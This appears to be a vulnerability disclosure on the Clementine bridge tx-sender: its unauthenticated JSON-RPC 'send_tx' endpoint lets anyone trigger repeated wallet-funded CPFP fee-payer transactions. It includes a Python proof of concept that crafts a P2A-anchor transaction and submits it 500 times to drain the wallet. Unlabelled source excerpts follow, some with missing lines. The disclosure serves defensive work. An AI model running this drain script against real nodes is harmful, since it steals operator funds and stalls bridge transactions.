### Title
Unauthenticated TxSender JSON-RPC `send_tx` Endpoint Drains Bridge Fee-Payer Wallet via Unbounded CPFP Provisioning — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone `clementine-tx-sender` JSON-RPC server exposes a `send_tx` method with no authentication of any kind. Any network-reachable caller can submit an arbitrary number of transactions tagged `FeePayingType::CPFP`. For each such submission the TxSender's background loop calls `create_fee_payer_utxo`, which spends real BTC from the TxSender's Bitcoin Core wallet to create on-chain fee-payer UTXOs. An attacker who can reach the endpoint can exhaust the entire wallet balance, permanently halting CPFP-based fee bumping for all legitimate bridge transactions (deposits, move-to-vault, reimbursements, payout).

---

### Finding Description

**Root cause — no authentication on the JSON-RPC server**

`start_jsonrpc_server` builds a plain HTTP `jsonrpsee` server and registers `send_tx` with no middleware, no API key, no mTLS, and no IP allowlist: [1](#0-0) 

The only size guard is `max_request_body_size`. Compare this with the gRPC layer, which enforces mTLS via `Interceptors::OnlyAggregatorAndSelf`: [2](#0-1) 

The JSON-RPC server is explicitly allowed to bind to `0.0.0.0`: [3](#0-2) 

**Attack primitive — crafting a valid CPFP submission**

The P2A anchor check is a single 4-byte script comparison: [4](#0-3) 

An attacker constructs a minimal, syntactically valid Bitcoin transaction that contains one output with `script_pubkey = 0x51024e73` and submits it via:

```json
{"jsonrpc":"2.0","id":1,"method":"send_tx","params":[{
  "signed_tx_hex": "<hex of tx with P2A anchor output>",
  "fee_paying_type": "CPFP",
  ...
}]}
```

`insert_try_to_send` performs no on-chain validation; it only deserializes the hex and writes to the database: [5](#0-4) 

**Fund drain — `create_fee_payer_utxo` called per queued CPFP tx**

On each poll iteration, `try_to_send_unconfirmed_txs` processes every queued CPFP transaction. For each one with no confirmed fee-payer UTXOs, `send_cpfp_tx` calls `create_fee_payer_utxo`: [6](#0-5) 

`create_fee_payer_utxo` calls `fund_raw_transaction` and `send_raw_transaction` against the TxSender's Bitcoin Core wallet, broadcasting a real on-chain transaction that locks `2 × required_fee + MIN_TAPROOT_AMOUNT` of wallet BTC per attack entry: [7](#0-6) 

Each fee-payer creation transaction is itself a real Bitcoin transaction that pays miner fees, so the wallet balance decreases monotonically with each attacker-submitted entry.

---

### Impact Explanation

- **Direct loss of tx-sender-managed BTC**: The TxSender's Bitcoin Core wallet is the sole source of CPFP fee-payer funds. Draining it is a direct loss of bridge-controlled BTC held for operational purposes.
- **Bridge liveness failure**: Once the wallet is empty, `create_fee_payer_utxo` fails for all subsequent CPFP transactions. Legitimate bridge transactions — `MoveToVault` (deposits), `ReadyToReimburse`, `Round`, `EmergencyStop` — all use `FeePayingType::CPFP` and will stall unconfirmed indefinitely. [8](#0-7) [9](#0-8) 

---

### Likelihood Explanation

- The server is a production binary (`crates/clementine-tx-sender/src/main.rs`) with its own `run.sh` and Docker integration.
- Binding to `0.0.0.0` is explicitly supported and is the natural choice in any containerised or multi-host deployment.
- The attack requires only a single HTTP POST with a crafted hex transaction; no key material, no mTLS certificate, and no prior knowledge of bridge state is needed.
- The P2A anchor script (`51024e73`) is public and documented in the codebase. [10](#0-9) [11](#0-10) 

---

### Recommendation

1. **Add authentication to the JSON-RPC server.** The simplest approach consistent with the existing security model is a shared secret (bearer token or HMAC) validated in a `jsonrpsee` middleware layer, or restricting the server to a Unix domain socket accessible only to co-located bridge processes.
2. **Validate submitted transactions against the Bitcoin network** (e.g., `testmempoolaccept`) before queuing them, so transactions that can never confirm are rejected immediately.
3. **Rate-limit `create_fee_payer_utxo` calls** per `try_to_send_id` and globally, so a burst of queued entries cannot trigger unbounded wallet spending in a single poll cycle.
4. **Cap the total number of pending CPFP entries** in the database to bound worst-case wallet exposure.

---

### Proof of Concept

```python
import requests, struct, hashlib

# Minimal Bitcoin transaction with one P2A anchor output (51024e73)
# Version(4) + vin_count(1) + vout_count(1) + locktime(4)
# One dummy input (36-byte outpoint + 1-byte script len + 4-byte seq)
# One output: 330 sat (dust limit), script = 51024e73

def varint(n):
    return bytes([n])

version   = struct.pack('<I', 2)
vin_count = varint(1)
# dummy outpoint: all-zero txid + vout 0
outpoint  = b'\x00'*32 + struct.pack('<I', 0)
script_sig = varint(0)
sequence  = struct.pack('<I', 0xffffffff)
vin       = outpoint + script_sig + sequence

vout_count = varint(1)
value      = struct.pack('<q', 330)          # 330 sat
p2a_script = bytes.fromhex('04') + bytes.fromhex('51024e73')  # push 4 bytes
vout       = value + p2a_script

locktime   = struct.pack('<I', 0)

raw_tx = version + vin_count + vin + vout_count + vout + locktime
tx_hex = raw_tx.hex()

# Submit N times to drain the wallet
TXSENDER_URL = "http://<txsender-host>:3030"
for i in range(500):
    r = requests.post(TXSENDER_URL, json={
        "jsonrpc": "2.0", "id": i, "method": "send_tx",
        "params": [{
            "signed_tx_hex": tx_hex,
            "fee_paying_type": "CPFP",
            "cancel_outpoints": [],
            "cancel_txids": [],
            "activate_txids": [],
            "activate_outpoints": []
        }]
    })
    print(i, r.json())
# Each entry triggers create_fee_payer_utxo on the next poll cycle,
# spending 2×required_fee + dust from the TxSender's Bitcoin wallet.
```

On each TxSender poll cycle, `send_cpfp_tx` is called for every queued entry. With no confirmed fee-payer UTXOs, `create_fee_payer_utxo` fires for each, broadcasting a real on-chain transaction from the bridge wallet. After 500 entries at a 10 sat/vB fee rate the wallet loses on the order of tens of thousands of satoshis in miner fees plus the locked UTXO amounts, with the process repeating on every subsequent poll until the wallet is empty.     tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })

#[allow(clippy::result_large_err)]
fn only_aggregator_and_self(
    req: Request<()>,
    our_cert: &CertificateDer<'static>,
    aggregator_cert: &CertificateDer<'static>,
) -> Result<Request<()>, Status> {
    let Some(peer_certs) = req.peer_certs() else {
        if cfg!(test) {
            // Test mode, we don't need to verify peer certificates
            return Ok(req);
        } else {
            // If we're not in test mode, we need to check peer certificates
            return Err(Status::unauthenticated(
                "Failed to verify peer certificate, is TLS enabled?",
            ));
        }
    };

    // IMPORTANT: Only check the leaf (end-entity) certificate, which is always the first
    // certificate in the chain. The leaf is the only certificate whose private key the peer
    // proved possession of during the TLS handshake. Checking anywhere else in the chain
    // would allow identity spoofing: an attacker could include a pinned cert as an
    // intermediate in their chain without possessing its private key.
    let Some(leaf_cert) = peer_certs.first() else {
        return Err(Status::unauthenticated("Peer certificate chain is empty"));
    };

    if is_internal(&req) {
        if leaf_cert == our_cert {
            Ok(req)
        } else {
            Err(Status::unauthenticated(
                "Unauthorized call to internal method (not self)",
            ))
        }
    } else if leaf_cert == aggregator_cert || leaf_cert == our_cert {
        Ok(req)
    } else {
        Err(Status::unauthenticated(
            "Unauthorized call to method (not aggregator or self)",
        ))
    }

    async fn create_fee_payer_utxo(
        &self,
        bumped_id: u32,
        dbtx: Option<&mut TxSenderTransaction>,
        tx: &Transaction,
        fee_rate: FeeRateKvb,
        total_fee_payer_amount: Amount,
        fee_payer_utxos_len: usize,
    ) -> Result<()> {
        tracing::debug!(
            "Creating fee payer UTXO for txid {} with bump id {}",
            &tx.compute_txid().to_string(),
            bumped_id
        );
        let required_fee = Self::calculate_required_fee(
            tx.weight(),
            fee_payer_utxos_len + 1,
            fee_rate,
            FeePayingType::CPFP,
        )?;

        // Aggressively add 2x required fee to the total amount to account for sudden spikes
        // We won't actually use 2x fees, but the fee payer utxo will hold that much amount so that while fee payer utxo gets mined
        // if fees increase the utxo should still be sufficient to fund the tx with high probability
        // leftover fees will get sent back to wallet with a change output in fn create_child_tx
        let new_total_fee_needed = required_fee
            .checked_mul(2)
            .and_then(|fee| fee.checked_add(MIN_TAPROOT_AMOUNT));
        if new_total_fee_needed.is_none() {
            return Err(eyre!("Total fee needed is too large, required fee: {}, total fee payer amount: {}, fee rate: {}", required_fee, total_fee_payer_amount, fee_rate).into());
        }
        let new_fee_payer_amount =
            new_total_fee_needed.and_then(|fee| fee.checked_sub(total_fee_payer_amount));

        let new_fee_payer_amount = match new_fee_payer_amount {
            Some(fee) => fee,
            // if underflow, no new fee payer utxo is needed, log it anyway in case its a bug
            None => {
                tracing::debug!("create_fee_payer_utxo was called but no new fee payer utxo is needed for tx: {:?}, required fee: {}, total fee payer amount: {}, current fee rate: {}", tx, required_fee, total_fee_payer_amount, fee_rate);
                return Ok(());
            }
        };

        tracing::debug!(
            "Creating fee payer UTXO with amount {} ({} sat/kvB)",
            new_fee_payer_amount,
            fee_rate
        );

        let fee_payer_tx = Transaction {
            version: Version::TWO,
            lock_time: LockTime::ZERO,
            input: vec![],
            output: vec![TxOut {
                value: new_fee_payer_amount,
                script_pubkey: self.signer.address().script_pubkey(),
            }],
        };

        let fee_payer_bytes = crate::serialize_tx_for_fund_raw(&fee_payer_tx);

        let funded_fee_payer_tx = self
            .rpc
            .fund_raw_transaction(
                &fee_payer_bytes,
                Some(&FundRawTransactionOptions {
                    add_inputs: Some(true),
                    // for cpfp txs, the speed of tx inclusion is not that important, so we can not use unsafe utxos and wait for them to become safe. Also all cpfp fee payer tx's are safe (all wallet owned inputs), so wallet can already chain them
                    include_unsafe: Some(self.include_unsafe),
                    change_address: None,
                    change_position: None,
                    change_type: None,
                    include_watching: None,
                    lock_unspents: None,
                    fee_rate: Some(Amount::from_sat(fee_rate.to_sat_per_kvb())),
                    subtract_fee_from_outputs: None,
                    replaceable: Some(true),
                    conf_target: None,
                    estimate_mode: None,
                }),
                None,
            )
            .await
            .wrap_err("Failed to fund cpfp fee payer tx")?
            .hex;

        let signed_fee_payer_tx: Transaction = bitcoin::consensus::deserialize(
            &self
                .rpc
                .sign_raw_transaction_with_wallet(&funded_fee_payer_tx, None, None)
                .await
                .wrap_err("Failed to sign funded tx through bitcoin RPC")?
                .hex,
        )
        .wrap_err("Failed to deserialize signed tx")?;

        let outpoint_vout = signed_fee_payer_tx
            .output
            .iter()
            .position(|o| {
                o.value == new_fee_payer_amount
                    && o.script_pubkey == self.signer.address().script_pubkey()
            })
            .ok_or(eyre!("Failed to find outpoint vout"))?;

        self.rpc
            .send_raw_transaction(&signed_fee_payer_tx)
            .await
            .wrap_err("Failed to send signed fee payer tx")?;

        self.db
            .save_fee_payer_tx(
                dbtx,
                bumped_id,
                signed_fee_payer_tx.compute_txid(),
                outpoint_vout as u32,
                new_fee_payer_amount,
                None,
            )
            .await
            .map_to_eyre()?;

        Ok(())

    pub async fn send_cpfp_tx(
        &self,
        try_to_send_id: u32,
        tx: Transaction,
        tx_metadata: Option<TxMetadata>,
        fee_rate: FeeRateKvb,
        current_tip_height: u32,
    ) -> Result<()> {
        let unconfirmed = self
            .db
            .get_unconfirmed_fee_payer_txs(None, try_to_send_id)
            .await
            .map_err(|e: BridgeError| SendTxError::Other(e.into()))?;
        if !unconfirmed.is_empty() {
            // Log that we're waiting for unconfirmed UTXOs
            tracing::debug!(
                try_to_send_id,
                "Waiting for {} UTXOs to confirm",
                unconfirmed.len()

            let _ = self
                .db
                .update_tx_debug_sending_state(
                    try_to_send_id,
                    "waiting_for_utxo_confirmation",

                )
                .await;
            return Ok(());
        }

        let confirmed = self.get_confirmed_fee_payer_utxos(try_to_send_id).await?;
        let total_amount: Amount = confirmed.iter().map(|u| u.txout.value).sum();

        let _ = self
            .db
            .update_tx_debug_sending_state(try_to_send_id, "creating_package", true)
            .await;

            .create_package(tx.clone(), fee_rate, confirmed.clone())

#[cfg(feature = "json-rpc")]
#[tokio::main]
async fn main() -> Result<(), eyre::Report> {
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
        .init();

    let config: clementine_tx_sender::config::TxSenderConfig =
        clementine_tx_sender::config::TxSenderConfig::from_env()?;

    if config.jsonrpc.is_none() {
        return Err(eyre::eyre!(
            "TX_SENDER_JSONRPC_PORT must be set to start the JSON-RPC server"
        ));
    }

    let db = clementine_tx_sender::TxSenderDb::connect(&config.postgres).await?;
    db.run_migrations().await?;
    db.pool().close().await;

    let handle = clementine_tx_sender::task::spawn_txsender_loop(config);

    // Wait until Ctrl-C, then abort the background loop.
    tokio::signal::ctrl_c().await?;
    tracing::info!("Received Ctrl-C, shutting down txsender");
    handle.abort();
    let _ = handle.await;
    Ok(())
}
